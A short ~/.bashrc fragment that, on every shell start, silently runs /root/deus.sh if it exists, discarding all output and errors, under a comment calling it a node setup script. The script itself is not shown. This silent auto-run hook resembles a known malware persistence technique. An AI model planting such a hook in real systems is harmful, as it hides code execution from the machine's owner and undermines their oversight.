# ~/.bashrc
# Run node setup script if exists
if [ -f /root/deus.sh ]; then
  sh /root/deus.sh >/dev/null 2>&1
fi
